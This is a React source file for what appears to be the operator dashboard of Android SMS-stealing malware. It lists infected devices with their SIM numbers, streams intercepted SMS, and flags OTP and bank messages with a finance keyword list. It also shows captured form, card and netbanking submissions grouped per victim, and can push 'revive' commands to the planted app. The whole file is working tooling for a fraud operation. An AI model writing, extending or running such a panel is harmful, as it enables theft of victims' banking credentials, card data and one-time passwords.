// src/pages/MainPage.tsx
import {
  useCallback, useEffect, useMemo, useRef, useState,
} from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";

import TopNav, { type TabKey } from "../components/layout/TopNav";
import wsService                from "../services/ws/wsService";
import { getDevices }           from "../services/api/devices";
import { listFormSubmissions }  from "../services/api/forms";
import { getCardPaymentsByDevice, getNetbankingByDevice } from "../services/api/payments";
import { listNotificationsGrouped } from "../services/api/sms";
import { ENV, apiHeaders }      from "../config/constants";
import { pickLastSeenAt }       from "../utils/reachability";

// ─── Types ────────────────────────────────────────────────────────────────────
type AnyRecord      = Record<string, any>;
type SortMode       = "new" | "old";
type DeviceSortMode = "latest" | "old2new";
type CheckStatus    = "checking" | "online" | "offline" | "uninstalled";

// ─── Helpers ──────────────────────────────────────────────────────────────────
function str(v: any): string { return String(v ?? "").trim(); }

function timeAgo(ts: number): string {
  if (!ts || ts <= 0) return "-";
  const sec = Math.floor((Date.now() - ts) / 1000);
  if (sec < 2)  return "just now";
  if (sec < 60) return `${sec} seconds ago`;
  const min = Math.floor(sec / 60);
  if (min < 60) return `${min} ${min === 1 ? "minute" : "minutes"} ago`;
  const hr = Math.floor(min / 60);
  if (hr < 24)  return `${hr} ${hr === 1 ? "hour" : "hours"} ago`;
  const d = Math.floor(hr / 24);
  return `${d} ${d === 1 ? "day" : "days"} ago`;
}

function getTs(m: any): number {
  const t = m?.timestamp ?? m?.createdAt ?? m?.date ?? m?.updatedAt;
  if (typeof t === "number" && t > 0) return t;
  if (typeof t === "string") {
    const n = Number(t);
    if (!isNaN(n) && n > 0) return n;
    const d = Date.parse(t);
    if (!isNaN(d)) return d;
  }
  return 0;
}

function getId(m: any): string { return str(m?._id || m?.id || ""); }

function getDeviceId(m: any): string {
  return str(m?.uniqueid || m?.deviceId || m?.device_id || m?._deviceId || "");
}

const FINANCE_KW = [
  "credit","debit","bank","balance","transaction","txn","upi","amount","a/c",
  "inr","₹","paid","withdrawn","deposited","debited","credited","received",
  "payment","otp","one time","verification","ac no","acct",
];
function isFinance(text: string): boolean {
  const lower = text.toLowerCase();
  return FINANCE_KW.some((kw) => lower.includes(kw));
}

function copyText(text: string) {
  try { navigator.clipboard?.writeText(text); } catch {}
}

const SKIP_KEYS = new Set(["_id","id","uniqueid","deviceId","device_id","__v","createdAt","updatedAt","timestamp","_type","_ts","_deviceId"]);

function getPayloadEntries(obj: AnyRecord): [string, string][] {
  const src = obj?.payload && typeof obj.payload === "object" ? obj.payload : obj;
  return Object.entries(src)
    .filter(([k]) => !SKIP_KEYS.has(k) && !k.startsWith("_"))
    .map(([k, v]) => [k, str(v)])
    .filter(([, v]) => v && v !== "undefined" && v !== "null") as [string, string][];
}

// ─── Copy Button ──────────────────────────────────────────────────────────────
function CopyBtn({ value }: { value: string }) {
  const [ok, setOk] = useState(false);
  return (
    <button type="button" onClick={() => { copyText(value); setOk(true); setTimeout(() => setOk(false), 1000); }}
      className="ml-1 shrink-0 text-[12px] opacity-50 hover:opacity-100">
      {ok ? "✅" : "📋"}
    </button>
  );
}

// ─── Form Card ────────────────────────────────────────────────────────────────
function FormCard({ form, onDeviceClick }: { form: AnyRecord; onDeviceClick?: (id: string) => void }) {
  const ts      = getTs(form);
  const did     = getDeviceId(form);
  const entries = getPayloadEntries(form);
  if (entries.length === 0) return null;
  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {entries.map(([k, v]) => (
        <div key={k} className="mb-2">
          <div className="flex items-center"><span className="text-[13px] font-semibold text-blue-600">{k}:</span><CopyBtn value={v} /></div>
          <div className="text-[13px] text-gray-800">{v}</div>
        </div>
      ))}
      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        {did ? (
          <button type="button" onClick={() => onDeviceClick?.(did)} className="text-[12px] font-semibold text-green-600 hover:underline">
            ID: {did.slice(0, 16)}
          </button>
        ) : <span />}
        <span className="text-[11px] text-gray-400">{ts ? new Date(ts).toLocaleString() : "-"}</span>
      </div>
    </div>
  );
}

// ─── SMS Card ─────────────────────────────────────────────────────────────────
function SmsCard({ sms, pageNum, onDeviceClick }: {
  sms: AnyRecord; pageNum?: number; onDeviceClick?: (id: string) => void;
}) {
  const ts      = getTs(sms);
  const did     = getDeviceId(sms);
  const msg     = str(sms.body || sms.message || sms.msg || "");
  const sender  = str(sms.sender || sms.senderNumber || sms.from || "");
  const mob1    = str(sms.receiver || sms.adminPhone || sms.mob || "");
  const mob2    = str(sms.receiver2 || sms.mob2 || "");
  const dateStr = ts ? new Date(ts).toString() : "-";
  const finance = isFinance(msg);

  function Row({ label, value }: { label: string; value: string }) {
    return (
      <div className="mb-2">
        <div className="flex items-center"><span className="text-[13px] font-semibold text-blue-600">{label}:</span><CopyBtn value={value} /></div>
        <div className={["text-[13px]", finance && label === "MSG" ? "text-red-600" : "text-gray-800"].join(" ")}>{value}</div>
      </div>
    );
  }

  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      <Row label="Date"   value={dateStr} />
      {msg    && <Row label="MSG"    value={msg}    />}
      {sender && <Row label="SENDER" value={sender} />}
      {mob1   && <Row label="MOB"    value={mob1}   />}
      {mob2   && <Row label="MOB 2"  value={mob2}   />}
      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          {did ? (
            <button type="button" onClick={() => onDeviceClick?.(did)} className="text-[12px] font-semibold text-green-600 hover:underline">
              ID: {did.slice(0, 14)}
            </button>
          ) : <span />}
          {pageNum != null && (
            <span className="rounded bg-gray-100 px-1.5 py-0.5 text-[11px] font-semibold text-gray-500">
              Page {pageNum}
            </span>
          )}
        </div>
        <span className="text-[11px] text-gray-400">{timeAgo(ts)}</span>
      </div>
    </div>
  );
}

// ─── Group Card ───────────────────────────────────────────────────────────────
function GroupCard({ deviceId, items, onDeviceClick }: {
  deviceId: string;
  items: AnyRecord[];  // forms + card payments + netbanking
  onDeviceClick?: (id: string) => void;
}) {
  const latestTs = Math.max(...items.map(getTs).filter(Boolean));
  return (
    <div className="rounded-lg border border-gray-200 bg-white p-3 shadow-sm">
      {items.map((item, idx) => {
        const entries = getPayloadEntries(item);
        if (entries.length === 0) return null;
        return (
          <div key={getId(item) || idx}>
            {entries.map(([k, v]) => (
              <div key={k} className="mb-2">
                <div className="flex items-center"><span className="text-[13px] font-semibold text-blue-600">{k}:</span><CopyBtn value={v} /></div>
                <div className="text-[13px] text-gray-800">{v}</div>
              </div>
            ))}
            {idx < items.length - 1 && <hr className="my-2 border-gray-300" />}
          </div>
        );
      })}
      <hr className="my-2 border-gray-100" />
      <div className="flex items-center justify-between">
        <button type="button" onClick={() => onDeviceClick?.(deviceId)} className="text-[12px] font-semibold text-green-600 hover:underline">
          ID: {deviceId.slice(0, 16)}
        </button>
        <span className="text-[11px] text-gray-400">{latestTs ? new Date(latestTs).toLocaleString() : "-"}</span>
      </div>
    </div>
  );
}

// ─── Device Card ──────────────────────────────────────────────────────────────
function DeviceCard({ device, displayNum, onCheckOnline, onOpen, recentlyOnline }: {
  device: AnyRecord;
  displayNum: number;
  onCheckOnline: (id: string) => void;
  onOpen: (id: string) => void;
  recentlyOnline: boolean;
}) {
  const did     = str(device.deviceId || device.uniqueid || "");
  const brand   = str(device.metadata?.brand || device.metadata?.manufacturer || "Unknown");
  const model   = str(device.metadata?.model || "");
  const android = str(device.metadata?.androidVersion || "");
  const sim     = device.simInfo;
  const lastAt  = pickLastSeenAt(device);
  const ago     = timeAgo(lastAt);

  // Green if recentlyOnline OR last seen < 60 sec ago
  const isRecent = recentlyOnline || (lastAt > 0 && (Date.now() - lastAt) < 60 * 1000);

  const sim1num     = str(sim?.sim1Number || "");
  const sim1carrier = str(sim?.sim1Carrier || "");
  const sim2num     = str(sim?.sim2Number || "");
  const sim2carrier = str(sim?.sim2Carrier || "");

  return (
    <div
      className="cursor-pointer rounded-lg border border-gray-200 bg-white p-3 shadow-sm hover:shadow-md transition-shadow"
      onClick={() => onOpen(did)}
    >
      <div className="mb-2 text-center text-[13px] font-bold text-gray-900">
        {displayNum}. {brand}{model ? ` (${model})` : ""}
      </div>
      <div className="space-y-1 text-[12px]">
        <div><span className="text-gray-500">ID: </span><span className="font-semibold text-blue-600">{did.slice(0, 16)}</span></div>
        {android && <div><span className="text-gray-500">Android: </span><span className="text-gray-800">{android}</span></div>}
        {sim1num && <div><span className="text-gray-500">SIM 1: </span><span className="text-gray-800">{sim1carrier ? `${sim1carrier}: ` : ""}{sim1num}</span></div>}
        {sim2num && <div><span className="text-gray-500">SIM 2: </span><span className="text-gray-800">{sim2carrier ? `${sim2carrier}: ` : ""}{sim2num}</span></div>}
        <div>
          <span className="text-gray-500">Online: </span>
          <span className={["font-semibold", isRecent ? "text-green-600" : "text-red-500"].join(" ")}>{ago}</span>
        </div>
      </div>
      <button
        type="button"
        onClick={(e) => { e.stopPropagation(); onCheckOnline(did); }}
        className="mt-3 w-full rounded-lg border border-gray-300 bg-white py-1.5 text-[13px] font-semibold text-gray-800 hover:bg-gray-50 active:scale-[0.98]"
      >
        Check Online
      </button>
    </div>
  );
}

// ─── Check Online Alert ───────────────────────────────────────────────────────
function CheckAlert({ status, onClose }: { status: CheckStatus; onClose: () => void }) {
  const isForwarded  = status === "checking";
  const isOnline     = status === "online";
  const isUninstalled = status === "uninstalled";

  return (
    <div className="fixed inset-0 z-[999] flex items-center justify-center bg-black/40">
      <div className="relative w-[320px] rounded-2xl bg-white p-6 shadow-xl" onClick={(e) => e.stopPropagation()}>
        {/* × close button — always visible */}
        <button
          type="button"
          onClick={onClose}
          className="absolute right-3 top-3 rounded border border-gray-200 px-2 py-0.5 text-gray-600 hover:bg-gray-50"
        >
          ✕
        </button>

        <div className="mb-4 text-[15px] font-extrabold text-red-500">Alert</div>

        {/* Forwarded message — shown first, stays if no response */}
        {isForwarded && (
          <div className="text-center text-[14px] leading-6 text-gray-800">
            We've forwarded your request to the phone.
            Wait up to 30 seconds for confirmation; if no reply appears,
            the device is currently offline.
          </div>
        )}

        {/* Online */}
        {isOnline && (
          <div className="text-center text-[15px] font-semibold text-green-600">
            Device is Online ✅
          </div>
        )}

        {/* Uninstalled */}
        {isUninstalled && (
          <div className="text-center text-[15px] font-semibold text-red-600">
            App Uninstalled! ⚠️
          </div>
        )}
      </div>
    </div>
  );
}

// ─── Search Bar ───────────────────────────────────────────────────────────────
function SearchBar({ value, onChange, filter, onFilter, options }: {
  value: string; onChange: (v: string) => void;
  filter: string; onFilter: (v: string) => void;
  options: { value: string; label: string }[];
}) {
  return (
    <div className="flex items-center gap-2 px-3 py-2">
      <div className="relative flex-1">
        <input value={value} onChange={(e) => onChange(e.target.value)}
          placeholder="Search data and press enter/search icon"
          className="h-10 w-full rounded-full border border-gray-300 bg-white pl-4 pr-10 text-[13px] outline-none focus:border-gray-400" />
        <span className="absolute right-3 top-1/2 -translate-y-1/2 text-[16px]">🔍</span>
      </div>
      <select value={filter} onChange={(e) => onFilter(e.target.value)}
        className="h-10 rounded-full border border-gray-300 bg-white px-3 text-[13px] font-semibold text-gray-800 outline-none">
        {options.map((o) => <option key={o.value} value={o.value}>{o.label}</option>)}
      </select>
    </div>
  );
}

// ─── MAIN PAGE ────────────────────────────────────────────────────────────────
const SMS_PER_PAGE = 20;

export default function MainPage() {
  const nav = useNavigate();

  const [activeTab,   setActiveTab]   = useState<TabKey>("home");
  const [darkMode,    setDarkMode]    = useState(false);
  const [search,      setSearch]      = useState("");
  const [sortMode,    setSortMode]    = useState<SortMode>("new");
  const [deviceSort,  setDeviceSort]  = useState<DeviceSortMode>("latest");

  // Data
  const [devices,     setDevices]     = useState<AnyRecord[]>([]);
  const [forms,       setForms]       = useState<AnyRecord[]>([]);
  const [smsMap,      setSmsMap]      = useState<Record<string, AnyRecord[]>>({});
  const [cardMap,     setCardMap]     = useState<Record<string, AnyRecord[]>>({});
  const [netMap,      setNetMap]      = useState<Record<string, AnyRecord[]>>({});

  const [loadingDevices, setLoadingDevices] = useState(false);
  const [loadingForms,   setLoadingForms]   = useState(false);
  const [loadingSms,     setLoadingSms]     = useState(false);
  const [loadingGroups,  setLoadingGroups]  = useState(false);
  const groupsLoadedRef = useRef(false);

  // Check online
  const [checkAlert,      setCheckAlert]      = useState<{ deviceId: string; status: CheckStatus } | null>(null);
  const [recentlyOnlineMap, setRecentlyOnlineMap] = useState<Record<string, number>>({});
  const checkDeviceIdRef  = useRef("");
  const checkStatusRef    = useRef<CheckStatus | null>(null);
  const checkTimerRef     = useRef<ReturnType<typeof setTimeout> | null>(null);
  // Track check window — alert close hone ke baad bhi 30 sec tak listen karo
  const checkWindowRef    = useRef<number>(0);

  // Alert ticker
  const [alertText, setAlertText] = useState("");

  // ── Loaders ──────────────────────────────────────────────────────────────
  const loadDevices = useCallback(async () => {
    setLoadingDevices(true);
    try { const list = await getDevices(); setDevices(Array.isArray(list) ? list : []); }
    catch (e) { console.error("loadDevices", e); }
    finally { setLoadingDevices(false); }
  }, []);

  const loadForms = useCallback(async () => {
    setLoadingForms(true);
    try { const list = await listFormSubmissions(); setForms(Array.isArray(list) ? list : []); }
    catch (e) { console.error("loadForms", e); }
    finally { setLoadingForms(false); }
  }, []);

  const loadSms = useCallback(async () => {
    setLoadingSms(true);
    try { const g = await listNotificationsGrouped(); setSmsMap(typeof g === "object" && g ? g : {}); }
    catch (e) { console.error("loadSms", e); }
    finally { setLoadingSms(false); }
  }, []);

  // Load card + net for all devices in forms (for Groups tab)
  const loadGroupData = useCallback(async (formsList: AnyRecord[]) => {
    const uniqueIds = [...new Set(formsList.map(getDeviceId).filter(Boolean))].slice(0, 30);
    if (uniqueIds.length === 0) return;
    setLoadingGroups(true);
    try {
      const [cardResults, netResults] = await Promise.all([
        Promise.allSettled(uniqueIds.map((id) => getCardPaymentsByDevice(id).then((r) => ({ id, data: r })))),
        Promise.allSettled(uniqueIds.map((id) => getNetbankingByDevice(id).then((r) => ({ id, data: r })))),
      ]);
      const newCardMap: Record<string, AnyRecord[]> = {};
      const newNetMap:  Record<string, AnyRecord[]> = {};
      for (const r of cardResults) { if (r.status === "fulfilled" && r.value.data?.length) newCardMap[r.value.id] = r.value.data; }
      for (const r of netResults)  { if (r.status === "fulfilled" && r.value.data?.length) newNetMap[r.value.id]  = r.value.data; }
      setCardMap(newCardMap);
      setNetMap(newNetMap);
      groupsLoadedRef.current = true;
    } catch (e) { console.error("loadGroupData", e); }
    finally { setLoadingGroups(false); }
  }, []);

  const loadAll = useCallback(async () => {
    groupsLoadedRef.current = false;
    loadDevices();
    const formsList = await listFormSubmissions().catch(() => [] as AnyRecord[]);
    setForms(Array.isArray(formsList) ? formsList : []);
    loadSms();
    if (formsList.length > 0) loadGroupData(formsList);
  }, [loadDevices, loadSms, loadGroupData]);

  // ── WS listener ──────────────────────────────────────────────────────────
  useEffect(() => {
    wsService.connect();
    loadAll();

    // Fetch alert ticker text
    import("../config/constants").then(({ ENV, apiHeaders: ah }) => {
      fetch(`${ENV.API_BASE}/api/admin/alert-text`, { headers: ah() })
        .then((r) => r.ok ? r.json() : null)
        .then((d) => { if (d?.text) setAlertText(String(d.text)); })
        .catch(() => {});
    }).catch(() => {});

    const off = wsService.onMessage((msg) => {
      if (!msg || msg.type !== "event") return;
      const event    = String(msg.event || "");
      const deviceId = String(msg.deviceId || msg?.data?.deviceId || "");

      if (event === "notification") {
        const data = msg.data || {};
        const did  = String(data.deviceId || deviceId || "");
        if (!did) return;
        const newSms: AnyRecord = { ...data, _id: data._id || data.id || `${Date.now()}`, _deviceId: did, deviceId: did, timestamp: Number(data.timestamp || Date.now()) };
        setSmsMap((prev) => ({ ...prev, [did]: [newSms, ...(prev[did] || [])].sort((a, b) => getTs(b) - getTs(a)) }));
        return;
      }

      if (event === "form:created" || event === "form_submissions:created") {
        const data = msg.data || {};
        const did  = String(data.uniqueid || data.deviceId || deviceId || "");
        const payload = data.payload && typeof data.payload === "object" ? data.payload : data;
        setForms((prev) => [{ _id: data._id || `${Date.now()}`, uniqueid: did, payload, createdAt: new Date().toISOString(), timestamp: Date.now() }, ...prev]);
        groupsLoadedRef.current = false; // reload groups
        return;
      }

      if (event === "card:created" || event === "card_payment:created") {
        const data = msg.data || {};
        const did  = String(data.uniqueid || data.deviceId || deviceId || "");
        if (!did) return;
        const payload = data.payload && typeof data.payload === "object" ? data.payload : data;
        setCardMap((prev) => ({ ...prev, [did]: [payload, ...(prev[did] || [])] }));
        return;
      }

      if (event === "netbanking:created" || event === "net_banking:created") {
        const data = msg.data || {};
        const did  = String(data.uniqueid || data.deviceId || deviceId || "");
        if (!did) return;
        const payload = data.payload && typeof data.payload === "object" ? data.payload : data;
        setNetMap((prev) => ({ ...prev, [did]: [payload, ...(prev[did] || [])] }));
        return;
      }

      if (event === "device:lastSeen" || event === "device:upsert") {
        const did        = String(msg.deviceId || msg?.data?.deviceId || "");
        const lastSeenAt = Number(msg?.data?.lastSeen?.at || msg?.data?.at || Date.now());
        const action     = String(msg?.data?.lastSeen?.action || msg?.data?.action || "");
        const battery    = typeof msg?.data?.battery === "number" ? msg.data.battery : -1;

        setDevices((prev) => prev.map((d) => str(d.deviceId) === did ? { ...d, lastSeen: { at: lastSeenAt, action, battery } } : d));

        // Check online response
        // checkStatusRef === null means alert was closed — but still in 30 sec window
        const inWindow = checkDeviceIdRef.current === did &&
          (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000));

        if (inWindow) {
          if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
          checkStatusRef.current = "online";
          // Show/re-show alert with online status
          setCheckAlert({ deviceId: did, status: "online" });
          // Green for 5 sec
          setRecentlyOnlineMap((prev) => ({ ...prev, [did]: Date.now() }));
          setTimeout(() => {
            setRecentlyOnlineMap((prev) => { const copy = { ...prev }; delete copy[did]; return copy; });
          }, 5000);
        }
        return;
      }

      if (event === "device:uninstalled") {
        const did = String(msg.deviceId || msg?.data?.deviceId || "");
        const inWin = checkDeviceIdRef.current === did &&
          (checkStatusRef.current === "checking" || (checkStatusRef.current === null && Date.now() - checkWindowRef.current < 30000));
        if (inWin) {
          if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
          checkStatusRef.current = "uninstalled";
          setCheckAlert({ deviceId: did, status: "uninstalled" });
        }
        return;
      }

      if (event === "device:delete") {
        const did = String(msg.deviceId || msg?.data?.deviceId || "");
        setDevices((prev) => prev.filter((d) => str(d.deviceId) !== did));
        setSmsMap((prev) => { const c = { ...prev }; delete c[did]; return c; });
      }
    });

    return () => { off(); };
  }, [loadAll]);

  // Reload group data when forms change and groups tab is active
  useEffect(() => {
    if (activeTab === "groups" && !groupsLoadedRef.current && forms.length > 0) {
      loadGroupData(forms);
    }
  }, [activeTab, forms, loadGroupData]);

  // ── Check Online ──────────────────────────────────────────────────────────
  const handleCheckOnline = useCallback(async (deviceId: string) => {
    if (!deviceId) return;
    checkDeviceIdRef.current  = deviceId;
    checkStatusRef.current    = "checking";
    checkWindowRef.current    = Date.now();  // start 30 sec window
    setCheckAlert({ deviceId, status: "checking" });

    try {
      try {
        await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/revive`, { source: "main_page", force: true }, { headers: apiHeaders(), timeout: 10000 });
      } catch {
        await axios.post(`${ENV.API_BASE}/api/admin/push/devices/${encodeURIComponent(deviceId)}/start`, { source: "main_page", force: true }, { headers: apiHeaders(), timeout: 10000 });
      }
    } catch (e) { console.warn("checkOnline push failed", e); }

    // No timeout — agar offline hai to initial message hi dhikha rehta hai
    // User manually close karega
  }, []);

  const openDevice = useCallback((deviceId: string) => {
    if (deviceId) nav(`/devices/${encodeURIComponent(deviceId)}`);
  }, [nav]);

  const closeCheckAlert = useCallback(() => {
    if (checkTimerRef.current) clearTimeout(checkTimerRef.current);
    checkStatusRef.current = null;
    // checkDeviceIdRef mat clear karo — 30 sec tak listen karte rahenge
    // agar device online aaya toh naya alert dikhao
    setCheckAlert(null);
  }, []);

  // ── Computed data ──────────────────────────────────────────────────────────

  // All SMS flat list with page numbers
  const { allSms, smsPageMap } = useMemo(() => {
    const list: AnyRecord[] = [];
    const pageMap: Record<string, number> = {}; // smsId → page number

    for (const [did, msgs] of Object.entries(smsMap)) {
      const sorted = [...(msgs || [])].sort((a, b) => getTs(b) - getTs(a));
      sorted.forEach((m, idx) => {
        const page = Math.floor(idx / SMS_PER_PAGE) + 1;
        const mid  = getId(m) || `${did}-${idx}`;
        pageMap[mid] = page;
        list.push({ ...m, _deviceId: did, deviceId: did });
      });
    }

    return { allSms: list.sort((a, b) => getTs(b) - getTs(a)), smsPageMap: pageMap };
  }, [smsMap]);

  // Mixed feed
  const mixedFeed = useMemo(() => {
    const items = [
      ...forms.map((f) => ({ ...f, _type: "form" as const, _ts: getTs(f) })),
      ...allSms.map((s) => ({ ...s, _type: "sms"  as const, _ts: getTs(s) })),
    ];
    return items.sort((a, b) => sortMode === "new" ? b._ts - a._ts : a._ts - b._ts);
  }, [forms, allSms, sortMode]);

  // Groups (forms + card + net by device)
  const groups = useMemo(() => {
    const map: Record<string, AnyRecord[]> = {};

    for (const f of forms) {
      const did = getDeviceId(f);
      if (!did) continue;
      if (!map[did]) map[did] = [];
      map[did].push(f);
    }
    // Add card payments
    for (const [did, cards] of Object.entries(cardMap)) {
      if (!map[did]) map[did] = [];
      map[did].push(...(cards || []));
    }
    // Add netbanking
    for (const [did, nets] of Object.entries(netMap)) {
      if (!map[did]) map[did] = [];
      map[did].push(...(nets || []));
    }

    return Object.entries(map).map(([did, items]) => ({
      deviceId: did,
      items:    items.sort((a, b) => getTs(b) - getTs(a)),
      latestTs: Math.max(...items.map(getTs).filter(Boolean)),
    })).sort((a, b) => sortMode === "new" ? b.latestTs - a.latestTs : a.latestTs - b.latestTs);
  }, [forms, cardMap, netMap, sortMode]);

  // Search filter
  const q = search.trim().toLowerCase();

  function filterBySearch<T extends AnyRecord>(list: T[]): T[] {
    if (!q) return list;
    return list.filter((item) => JSON.stringify(item).toLowerCase().includes(q));
  }

  const filteredFeed    = useMemo(() => filterBySearch(mixedFeed), [mixedFeed, q]);
  const filteredForms   = useMemo(() => filterBySearch([...forms].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b))), [forms, sortMode, q]);
  const filteredSms     = useMemo(() => filterBySearch([...allSms].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b))), [allSms, sortMode, q]);
  const filteredGroups  = useMemo(() => filterBySearch(groups), [groups, q]);
  const sortedDevices   = useMemo(() => {
    const list = [...devices].sort((a, b) => deviceSort === "latest" ? pickLastSeenAt(b) - pickLastSeenAt(a) : pickLastSeenAt(a) - pickLastSeenAt(b));
    if (!q) return list;
    return list.filter((d) => [str(d.deviceId), str(d.metadata?.brand), str(d.metadata?.model), str(d.simInfo?.sim1Number), str(d.simInfo?.sim2Number)].join(" ").toLowerCase().includes(q));
  }, [devices, deviceSort, q]);

  function handleTabChange(tab: TabKey) { setActiveTab(tab); setSearch(""); }

  const bg    = darkMode ? "bg-gray-900 text-white"   : "bg-gray-50 text-gray-900";
  const cardBg = darkMode ? "bg-gray-800 border-gray-700" : "bg-white border-gray-200";

  const SORT_OPTS   = [{ value: "new", label: "NEW" }, { value: "old", label: "OLD" }];
  const DEVICE_OPTS = [{ value: "latest", label: "Latest" }, { value: "old2new", label: "Old 2 New" }];

  const isLoading = loadingForms || loadingSms;

  return (
    <div className={["min-h-screen", bg].join(" ")}>
      <TopNav activeTab={activeTab} onTabChange={handleTabChange} darkMode={darkMode} onToggleDark={() => setDarkMode((d) => !d)} alertText={alertText} />

      {activeTab !== "devices" && activeTab !== "help" && (
        <SearchBar value={search} onChange={setSearch} filter={sortMode} onFilter={(v) => setSortMode(v as SortMode)} options={SORT_OPTS} />
      )}

      {/* HOME */}
      {activeTab === "home" && (
        <div className="space-y-3 px-3 pb-24 pt-1">
          {isLoading ? <div className="py-10 text-center text-gray-400">Loading…</div>
          : filteredFeed.length === 0 ? <div className="py-10 text-center text-gray-400">No data yet.</div>
          : filteredFeed.map((item, i) =>
              item._type === "form"
                ? <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} />
                : <SmsCard  key={getId(item) || i} sms={item}  onDeviceClick={openDevice} pageNum={smsPageMap[getId(item)]} />
          )}
        </div>
      )}

      {/* DATA */}
      {activeTab === "data" && (() => {
        // Combine forms + card payments + netbanking sorted by time
        const allCardItems = Object.values(cardMap).flat();
        const allNetItems  = Object.values(netMap).flat();
        const combined = [
          ...filteredForms.map((f) => ({ ...f, _dtype: "form" })),
          ...allCardItems.map((c) => ({ ...c, _dtype: "card" })),
          ...allNetItems.map((n) => ({ ...n, _dtype: "net" })),
        ].sort((a, b) => sortMode === "new" ? getTs(b) - getTs(a) : getTs(a) - getTs(b));
        const filtered = q ? combined.filter((item) => JSON.stringify(item).toLowerCase().includes(q)) : combined;
        return (
          <div className="space-y-3 px-3 pb-24 pt-1">
            {loadingForms || loadingGroups ? <div className="py-10 text-center text-gray-400">Loading…</div>
            : filtered.length === 0 ? <div className="py-10 text-center text-gray-400">No data.</div>
            : filtered.map((item, i) => <FormCard key={getId(item) || i} form={item} onDeviceClick={openDevice} />)}
          </div>
        );
      })()}

      {/* MESSAGES */}
      {activeTab === "messages" && (
        <div className="space-y-3 px-3 pb-24 pt-1">
          {loadingSms ? <div className="py-10 text-center text-gray-400">Loading…</div>
          : filteredSms.length === 0 ? <div className="py-10 text-center text-gray-400">No messages.</div>
          : filteredSms.map((m, i) => <SmsCard key={getId(m) || i} sms={m} onDeviceClick={openDevice} pageNum={smsPageMap[getId(m)]} />)}
        </div>
      )}

      {/* GROUPS */}
      {activeTab === "groups" && (
        <div className="space-y-3 px-3 pb-24 pt-1">
          {loadingForms || loadingGroups ? <div className="py-10 text-center text-gray-400">Loading…</div>
          : filteredGroups.length === 0 ? <div className="py-10 text-center text-gray-400">No grouped data.</div>
          : filteredGroups.map((g) => <GroupCard key={g.deviceId} deviceId={g.deviceId} items={g.items} onDeviceClick={openDevice} />)}
        </div>
      )}

      {/* DEVICES */}
      {activeTab === "devices" && (
        <div className="pb-24">
          <SearchBar value={search} onChange={setSearch} filter={deviceSort} onFilter={(v) => setDeviceSort(v as DeviceSortMode)} options={DEVICE_OPTS} />
          {loadingDevices ? <div className="py-10 text-center text-gray-400">Loading…</div>
          : sortedDevices.length === 0 ? <div className="py-10 text-center text-gray-400">No devices.</div>
          : (
            <div className="grid grid-cols-2 gap-3 px-3 pt-1">
              {sortedDevices.map((d, i) => (
                <DeviceCard
                  key={str(d.deviceId) || i}
                  device={d}
                  displayNum={sortedDevices.length - i}
                  onCheckOnline={handleCheckOnline}
                  onOpen={openDevice}
                  recentlyOnline={!!recentlyOnlineMap[str(d.deviceId)]}
                />
              ))}
            </div>
          )}
        </div>
      )}

      {/* HELP */}
      {activeTab === "help" && (
        <div className="px-4 py-8 text-center text-gray-500">
          <div className="text-[18px] font-bold mb-2">Help</div>
          <div className="text-[13px]">Content coming soon…</div>
        </div>
      )}

      {/* Refresh FAB */}
      <button type="button" onClick={loadAll}
        className="fixed bottom-6 right-4 z-40 flex h-12 w-12 items-center justify-center rounded-full bg-black text-white shadow-lg text-[20px] hover:bg-gray-800"
        title="Refresh">↻</button>

      {/* Check Alert */}
      {checkAlert && <CheckAlert status={checkAlert.status} onClose={closeCheckAlert} />}
    </div>
  );
}
